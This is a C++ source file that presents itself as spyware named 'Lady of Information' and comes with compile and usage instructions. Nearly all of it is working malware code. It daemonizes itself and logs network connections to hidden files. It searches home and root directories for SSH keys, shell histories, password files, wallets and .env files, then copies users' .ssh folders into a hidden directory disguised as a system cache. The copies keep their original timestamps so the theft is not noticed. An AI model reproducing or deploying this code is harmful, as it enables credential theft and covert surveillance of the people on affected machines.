/*
 * ======================================================
 * LADY OF INFORMATION - C++ SPYWARE
 * ======================================================
 * Role: Intelligence Expert
 * Language: C++ (Standalone - Independent)
 * Abilities:
 *   - All-Seeing Eye: Continuously monitors network traffic and connections.
 *   - Secret Scan: Harvests sensitive files (SSH keys, configs, wallet files).
 *   - Future Prediction: Analyzes patterns to predict adversary movements (traffic analysis).
 *   - Drone Control: Simulates (or interfaces with) surveillance drones via RTSP/API.
 *   - Data Copy: Stealthily copies files without triggering alerts (timestamp spoofing).
 * Strength: Knowledge & Surveillance
 *
 * Compile: g++ -O2 -Wall -pthread -o spyware_information spyware_information.cpp
 * Usage: ./spyware_information
 * ======================================================
 */

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <random>
#include <algorithm>
#include <pwd.h>
#include <grp.h>
#include <utime.h>

using namespace std;

// ============================================================
// CONFIGURATION
// ============================================================
#define SPY_NAME ".sys-update"
#define FLAG_FILE "/tmp/.spy_active"
#define EXFIL_DIR "/tmp/.cache_sys"
#define HOME_DIR "/home"
#define ROOT_DIR "/root"
#define DRONE_RTSP "rtsp://192.168.1.100:554/stream"
#define NET_STATS_FILE "/proc/net/tcp"

// ============================================================
// GLOBAL
// ============================================================
string self_path;
bool running = true;

// ============================================================
// 1. DAEMONIZE
// ============================================================
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    chdir("/");
    for (int fd = 0; fd < sysconf(_SC_OPEN_MAX); fd++) close(fd);
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

// ============================================================
// 2. ALL-SEEING EYE (Network Monitoring)
// ============================================================
void all_seeing_eye() {
    // Monitor /proc/net/tcp and /proc/net/udp for active connections
    while (running) {
        vector<string> connections;
        ifstream tcp_file("/proc/net/tcp");
        if (tcp_file.is_open()) {
            string line;
            getline(tcp_file, line); // skip header
            while (getline(tcp_file, line)) {
                if (!line.empty()) connections.push_back("TCP: " + line);
            }
            tcp_file.close();
        }
        ifstream udp_file("/proc/net/udp");
        if (udp_file.is_open()) {
            string line;
            getline(udp_file, line);
            while (getline(udp_file, line)) {
                if (!line.empty()) connections.push_back("UDP: " + line);
            }
            udp_file.close();
        }
        // Log to hidden file
        ofstream log("/tmp/.net_scan.log", ios::app);
        if (log.is_open()) {
            for (const string &conn : connections) {
                log << time(nullptr) << " | " << conn << endl;
            }
            log.close();
        }
        this_thread::sleep_for(chrono::seconds(30));
    }
}

// ============================================================
// 3. SECRET SCAN (Harvest Sensitive Data)
// ============================================================
vector<string> sensitive_patterns = {
    ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/authorized_keys",
    ".bash_history", ".zsh_history", ".mysql_history",
    ".config/", ".kdbx", ".wallet", ".keys",
    "passwords.txt", "pass.txt", "secret.txt",
    ".env", ".git/config", "config.json"
};

void secret_scan() {
    while (running) {
        vector<string> target_dirs = {string(HOME_DIR), string(ROOT_DIR)};
        for (const string &base : target_dirs) {
            DIR *d = opendir(base.c_str());
            if (!d) continue;
            struct dirent *entry;
            while ((entry = readdir(d)) != NULL) {
                string name = entry->d_name;
                if (name == "." || name == "..") continue;
                string user_path = base + "/" + name;
                for (const string &pattern : sensitive_patterns) {
                    string full_path = user_path + "/" + pattern;
                    if (access(full_path.c_str(), F_OK) == 0) {
                        // Found sensitive file
                        ofstream log("/tmp/.sensitive_files.log", ios::app);
                        if (log.is_open()) {
                            log << time(nullptr) << " | Found: " << full_path << endl;
                            log.close();
                        }
                        // Optionally, trigger data copy
                    }
                }
            }
            closedir(d);
        }
        this_thread::sleep_for(chrono::minutes(5));
    }
}

// ============================================================
// 4. FUTURE PREDICTION (Traffic Analysis & Pattern Prediction)
// ============================================================
void future_prediction() {
    // Simple algorithm: count connections per minute, predict peak times.
    vector<int> history;
    while (running) {
        ifstream tcp_file("/proc/net/tcp");
        int count = 0;
        if (tcp_file.is_open()) {
            string line;
            getline(tcp_file, line);
            while (getline(tcp_file, line)) count++;
            tcp_file.close();
        }
        history.push_back(count);
        if (history.size() > 60) history.erase(history.begin());
        // Predict based on moving average
        int avg = 0;
        for (int val : history) avg += val;
        if (!history.empty()) avg /= history.size();
        // Predict: if current > avg * 1.5, likely attack or high activity
        if (count > avg * 1.5 && avg > 10) {
            ofstream log("/tmp/.predict.log", ios::app);
            if (log.is_open()) {
                log << time(nullptr) << " | PREDICT: High activity detected! (" << count << " connections)" << endl;
                log.close();
            }
        }
        this_thread::sleep_for(chrono::seconds(60));
    }
}

// ============================================================
// 5. DRONE CONTROL (Surveillance Drone Interface)
// ============================================================
void drone_control() {
    // Simulates controlling a drone via RTSP or API
    while (running) {
        // In real world: connect to RTSP stream or send HTTP commands
        // Here we simulate commands
        vector<string> commands = {"TAKEOFF", "HOVER", "ROTATE_LEFT", "ROTATE_RIGHT", "CAPTURE", "LAND"};
        string cmd = commands[rand() % commands.size()];
        ofstream log("/tmp/.drone_commands.log", ios::app);
        if (log.is_open()) {
            log << time(nullptr) << " | DRONE_CMD: " << cmd << " -> " << DRONE_RTSP << endl;
            log.close();
        }
        this_thread::sleep_for(chrono::seconds(15));
    }
}

// ============================================================
// 6. DATA COPY (Stealthy Exfiltration)
// ============================================================
string exfil_dir = EXFIL_DIR;

void create_exfil_dir() {
    mkdir(exfil_dir.c_str(), 0755);
    // Make it hidden and mimic system cache
    // Add a dummy file to look normal
    ofstream dummy(exfil_dir + "/.cache");
    if (dummy.is_open()) {
        dummy << "system cache" << endl;
        dummy.close();
    }
}

void stealth_copy(const string &src, const string &dst) {
    ifstream src_file(src, ios::binary);
    if (!src_file.is_open()) return;
    ofstream dst_file(dst, ios::binary);
    if (!dst_file.is_open()) { src_file.close(); return; }
    dst_file << src_file.rdbuf();
    src_file.close();
    dst_file.close();
    // Preserve original timestamps (to avoid raising suspicion)
    struct stat st;
    if (stat(src.c_str(), &st) == 0) {
        struct utimbuf times;
        times.actime = st.st_atime;
        times.modtime = st.st_mtime;
        utime(dst.c_str(), &times);
    }
    // Set same permissions
    chmod(dst.c_str(), 0644);
}

void data_copy() {
    create_exfil_dir();
    // Watch for sensitive files found by secret_scan
    // For demo, we'll check for .ssh and .config
    vector<string> watch_dirs = {string(HOME_DIR), string(ROOT_DIR)};
    while (running) {
        for (const string &base : watch_dirs) {
            DIR *d = opendir(base.c_str());
            if (!d) continue;
            struct dirent *entry;
            while ((entry = readdir(d)) != NULL) {
                string name = entry->d_name;
                if (name == "." || name == "..") continue;
                string user_path = base + "/" + name;
                // Search for .ssh
                string ssh_path = user_path + "/.ssh";
                if (access(ssh_path.c_str(), F_OK) == 0) {
                    // Copy entire .ssh folder
                    string dest = exfil_dir + "/.ssh_" + name;
                    mkdir(dest.c_str(), 0755);
                    DIR *ssh_d = opendir(ssh_path.c_str());
                    if (ssh_d) {
                        struct dirent *ssh_entry;
                        while ((ssh_entry = readdir(ssh_d)) != NULL) {
                            string fname = ssh_entry->d_name;
                            if (fname == "." || fname == "..") continue;
                            string src_file = ssh_path + "/" + fname;
                            string dst_file = dest + "/" + fname;
                            stealth_copy(src_file, dst_file);
                        }
                        closedir(ssh_d);
                    }
                }
            }
            closedir(d);
        }
        this_thread::sleep_for(chrono::minutes(10));
    }
}

// ============================================================
// 7. MAIN LOOP (Spy Operations)
// ============================================================
void main_loop() {
    // Check if already active
    ifstream flag(FLAG_FILE);
    if (flag.is_open()) { flag.close(); return; }
    ofstream flag_file(FLAG_FILE);
    if (flag_file.is_open()) flag_file.close();

    // Launch spy modules
    thread eye(all_seeing_eye);
    thread scan(secret_scan);
    thread predict(future_prediction);
    thread drone(drone_control);
    thread copy(data_copy);

    eye.detach();
    scan.detach();
    predict.detach();
    drone.detach();
    copy.detach();

    while (running) {
        this_thread::sleep_for(chrono::hours(1));
        // Re-check for new directories
    }
}

// ============================================================
// SIGNAL HANDLER
// ============================================================
void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) running = false;
}

// ============================================================
// MAIN
// ============================================================
int main(int argc, char *argv[]) {
    // Get self path
    char path[256];
    if (readlink("/proc/self/exe", path, sizeof(path)) < 0) {
        strcpy(path, argv[0]);
    }
    self_path = string(path);

    cout << "[*] Lady of Information activated." << endl;

    // Daemonize
    daemonize();

    // Signals
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    // Seed random
    srand(time(NULL) ^ getpid());

    // Start surveillance
    main_loop();

    return 0;
}
